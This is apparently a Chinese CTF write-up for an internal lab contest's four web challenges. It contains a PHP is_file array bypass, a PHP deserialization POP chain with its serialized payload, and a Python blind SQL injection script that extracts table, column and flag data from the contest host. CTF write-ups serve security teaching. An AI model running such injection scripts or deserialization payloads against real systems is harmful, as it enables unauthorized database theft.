---
title: henuctf2021-Web WP
author: Troy3e
avatar: 'https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ%E5%9B%BE%E7%89%8720210308190505.jpg'
authorAbout: steamID：888007034
authorDesc: Blizzard：TroyeSivan#51769
categories: 技术
comments: true
date: 2021-03-07 21:42:48
authorLink:
tags:
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1130992.png
---

实验室内部比赛，四个Web，都没什么难度，但可能没有考虑到20的学习情况，所以相对而言出得确实稍微难了一点。

一、Find
看了大家WP都是直接传flag.php的。。。

这题的本意其实完全不是这样的，当时出的快没细看，想着总得出一个php基础的题就想到了一个点，没想到大意了（不应该include flag.php的。。。

本题的考点就是用数组绕过is_file函数：

name[]=1
![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210307215001.png)

也算一个比较有意思的点吧 记住就行。

二、Mai
php反序列化，没想到大家都没遇见过这种的。。。我记得buu上有很多反序列化的，可能是还没做到。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210307215305.png)

这道题稍微有点反序列化知识就能做，源码也很少。
首先根据提示要先知道key，那么就需要触发toString魔法函数，我看到有些同学都在想办法把什么对象当字符串输出，没错这是触发toString的方法之一，但是在这里并没有机会。事实上，只要把对象当成字符串比较就能触发toString了。即我后来提示的wakeup函数的第一行。所以在construct函数中实例化baby类就行了。

POP链：

    <?php
    class baby{
	    public $baby;
    }
    class flag{
	    public $baby;
	    public function __construct(){
		    $this->baby = new baby();
	    }
    }
    $troy3e=new flag();
    echo serialize($troy3e);
    ?>

得到

    O:4:"flag":1:{s:4:"baby";O:4:"baby":1:{s:4:"baby";N;}}

传参得key

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210307220504.png)

令code等于key

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210307220621.png)

传参得flag

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210307220654.png)

最后总结下思路：

flag类的$this->baby实例化为baby类 -> Get传参henu触发反序列化 -> 反序列化瞬间触发wakeup -> wakeup函数中将对象当字符串比较触发baby类toString -> 输出key

三、Love

和hgame week2 200ok!基本上一模一样的 估计大家都没看我发的wp吧。。。
贴个脚本自己看吧
出盲注确实有点离谱了，我是想着让大家复习一下hgame那道题的，没想到大家都没看，这种盲注大二之前尽量掌握。  

    import requests
    
    flag = ""
    url = "http://henuctf.com:5555/Love/"
    for i in range(1,1000):
        l = 28
        h = 132
        mid = (l + h) // 2
        while(l<h):
            #payload = "1'^(ord(mid(database(),{0},1))>{1})^'1'#".format(i,mid)
            #payload = "1'^(ord(mid((seselectlect(group_concat(table_name))ffromrom(information_schema.tables)where(table_schema='test')),{0},1))>{1})^'1'#".format(i, mid)
            #payload = "1'^(ord(mid((seselectlect(group_concat(column_name))ffromrom(information_schema.columns)where(table_name='flaghere')),{0},1))>{1})^'1'#".format(i, mid)
            #payload = "1'^(ord(mid((seselectlect(group_concat(yourflag))ffromrom(test.flaghere)),{0},1))>{1})^'1'#".format(i, mid)
            data={"name":payload,"submit":"%E7%AB%8B%E5%8D%B3%E5%8C%B9%E9%85%8D"}
            r = requests.post(url=url,data=data)
            #print(r.text)
            if "樱岛麻衣" in r.text:
                l = mid + 1
            else:
                h = mid
            mid = (l + h) //2
        flag +=chr(mid)
        print (flag)
    print (flag)

四、shop

这题是我前天buu上做到的 因为很简单就让永奇学长复现了环境 没想到大家也没遇见过。。。。确实是我的问题

这题很多人都做出来了 也就不多说了（因为已经被提示完了

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210307221859.png)